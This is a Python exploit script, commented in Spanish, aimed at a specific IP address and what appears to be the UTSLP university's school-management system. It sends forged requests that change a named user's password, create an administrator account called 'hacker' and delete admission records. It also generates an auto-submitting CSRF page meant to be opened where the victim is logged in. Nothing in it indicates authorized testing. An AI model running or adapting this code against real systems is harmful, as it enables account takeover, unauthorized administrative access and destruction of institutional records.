import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CSRFExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def test_csrf_vulnerability(self):
        """Prueba la vulnerabilidad CSRF detectada"""
        print("[*] Probando vulnerabilidad CSRF...")
        
        # Acciones críticas que podrían ser vulnerables a CSRF
        csrf_actions = [
            {
                'url': '/jsp/admin/cambiar_password.jsp',
                'data': {
                    'yAccion': 'cambiar_password',
                    'yUsuario': 'hnieto',
                    'xPasswordActual': 'current123',
                    'xPasswordNuevo': 'hacked123',
                    'xConfirmarPassword': 'hacked123'
                },
                'description': 'Cambio de contraseña de hnieto'
            },
            {
                'url': '/jsp/admin/crear_usuario.jsp',
                'data': {
                    'yAccion': 'crear_usuario',
                    'xUsuario': 'hacker',
                    'xPassword': 'hacked123',
                    'xEmail': 'hacker@utslp.edu.mx',
                    'xRol': 'administrador'
                },
                'description': 'Creación de usuario administrador'
            },
            {
                'url': '/jsp/escolar/proceso_admision/eliminar_registro.jsp',
                'data': {
                    'yAccion': 'eliminar',
                    'yInteresado': '1',
                    'xIdRegistro': '1'
                },
                'description': 'Eliminación de registro'
            }
        ]
        
        for action in csrf_actions:
            try:
                print(f"\n[+] Probando: {action['description']}")
                
                full_url = f"{self.base_url}{action['url']}"
                response = self.session.post(full_url, data=action['data'], timeout=8)
                
                print(f"    URL: {action['url']}")
                print(f"    Status: {response.status_code}")
                print(f"    Tamaño respuesta: {len(response.text)}")
                
                # Buscar indicadores de éxito
                if any(indicator in response.text for indicator in ['éxito', 'exito', 'correcto', 'actualizado', 'creado']):
                    print("    [!] ¡Posible acción exitosa!")
                elif "error" in response.text.lower():
                    print("    [-] Error en la acción")
                else:
                    print("    [+] Respuesta diferente - investigar manualmente")
                    
                # Guardar respuesta
                filename = f"csrf_test_{action['description'].replace(' ', '_')}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                    
            except Exception as e:
                print(f"    [-] Error: {e}")

    def create_csrf_exploit_page(self):
        """Crea una página HTML para explotar CSRF"""
        print("\n[*] Creando página de explotación CSRF...")
        
        csrf_exploit_html = """
<html>
<body>
<h1>Explotación CSRF - Sistema UTSLP</h1>

<form id="csrfForm" action="https://189.254.143.102/jsp/admin/cambiar_password.jsp" method="POST">
    <input type="hidden" name="yAccion" value="cambiar_password">
    <input type="hidden" name="yUsuario" value="hnieto">
    <input type="hidden" name="xPasswordActual" value="current123">
    <input type="hidden" name="xPasswordNuevo" value="hacked123">
    <input type="hidden" name="xConfirmarPassword" value="hacked123">
</form>

<script>
    document.getElementById('csrfForm').submit();
    alert('CSRF exploit ejecutado');
</script>

</body>
</html>
        """
        
        with open('csrf_exploit.html', 'w', encoding='utf-8') as f:
            f.write(csrf_exploit_html)
        print("[+] Página CSRF creada: csrf_exploit.html")
        print("[!] Abre este archivo en un navegador donde la víctima tenga sesión activa")

# Ejecutar explotación CSRF
print("=== EXPLOTACIÓN CSRF ===")
csrf_exploiter = CSRFExploiter("189.254.143.102")
csrf_exploiter.test_csrf_vulnerability()
csrf_exploiter.create_csrf_exploit_page()